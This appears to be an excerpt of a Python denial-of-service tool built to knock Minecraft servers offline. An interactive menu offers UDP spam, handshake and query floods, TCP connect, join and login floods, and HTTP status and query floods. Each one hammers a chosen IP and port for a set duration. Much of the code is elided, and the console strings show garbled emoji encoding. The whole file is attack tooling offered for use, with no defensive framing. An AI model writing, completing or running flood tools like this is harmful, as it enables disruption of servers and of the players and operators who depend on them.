...
def udp_spam(ip, port, duration, packet_size):
    ...
    print(Fore.CYAN + f"[ð] UDP Spam on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))  # Overwhelm Minecraft UDP (if enabled)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[â] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[â] Done! Sent {packet_count} packets.")
...
def udp_handshake(ip, port, duration, packet_size):
    ...
    print(Fore.CYAN + f"[ð] UDP Handshake Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
...
def udp_query(ip, port, duration, packet_size):
    ...
    print(Fore.CYAN + f"[ð] UDP Query Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
        ...
        sock.close()
        print(Fore.GREEN + f"[â] Done! Sent {packet_count} query packets.")

# Layer 4 TCP Methods (Minecraft-specific)
def tcp_connect(ip, port, duration, packet_size):
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"[ð] TCP Connect Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
        ...
        print(Fore.RED + f"[â] Error: {e}")
    print(Fore.GREEN + f"[â] Done! Made {connection_count} connections.")

def tcp_join(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)  # Fake join
    print(Fore.CYAN + f"[ð] TCP Join Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ...
        print(Fore.RED + f"[â] Error: {e}")
    print(Fore.GREEN + f"[â] Done! Sent {packet_count} join packets.")
...
def tcp_login(ip, port, duration, packet_size):
    ...
    print(Fore.CYAN + f"[ð] TCP Login Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
        ...
        print(Fore.RED + f"[â] Error: {e}")
    print(Fore.GREEN + f"[â] Done! Sent {packet_count} login attempts.")
...
def http_status_flood(ip, duration):
    ...
    print(Fore.CYAN + f"[ð] HTTP Status Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
        ...
        print(Fore.RED + f"[â] Error: {e}")
    print(Fore.GREEN + f"[â] Done! Sent {request_count} status requests.")

def http_query_flood(ip, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:25565/query"  # Common Minecraft query endpoint
    print(Fore.CYAN + f"[ð] HTTP Query Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
        ...
        print(Fore.RED + f"[â] Error: {e}")
    print(Fore.GREEN + f"[â] Done! Sent {request_count} query requests.")
    ...
    while True:
        try:
            ...
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[â] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[â] Invalid input! Numbers only.")

# Main Menu
def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "ð¹ Minecraft Attack Methods ð¹")
    print("  1. Layer 4 UDP")
    print("  2. Layer 4 TCP")
    ...
    if attack_type == "1":  # Layer 4 UDP
        ...
        if method in methods:
            ...
            print(Fore.RED + "[â] Invalid UDP method!")

    elif attack_type == "2":  # Layer 4 TCP
        print(Fore.LIGHTBLUE_EX + "\nð¹ Layer 4 TCP Methods ð¹")
        ...
        if method in methods:
            ...
            print(Fore.RED + "[â] Invalid TCP method!")

    elif attack_type == "3":  # Layer 7 HTTP
        print(Fore.LIGHTBLUE_EX + "\nð¹ Layer 7 HTTP Methods ð¹")
        ...
        if method in methods:
            ...
            print(Fore.RED + "[â] Invalid HTTP method!")

    else:
        print(Fore.RED + "[â] Invalid attack type!")
